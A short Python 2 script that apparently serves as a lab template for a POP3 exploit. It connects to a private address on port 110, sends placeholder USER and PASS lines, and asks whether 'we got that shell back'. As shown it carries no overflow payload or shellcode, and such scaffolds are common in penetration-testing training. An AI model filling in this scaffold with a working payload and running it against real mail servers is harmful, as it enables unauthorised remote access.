#!/usr/bin/env python
 
import socket
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
try:
    print"\nSending pwnicorns and rainbows..."
    s.connect(('192.168.0.166', 110))
    data = s.recv(1024)

    s.send('USER legitness ' + '\r\n')
    data = s.recv(1024)

    s.send('PASS 2legit2quit' + '\r\n')
    data = s.recv(1024)

    s.close()
    print"\nDone! Wonder if we got that shell back?"

except:
    print "Could not connect to POP3 for some reason..."
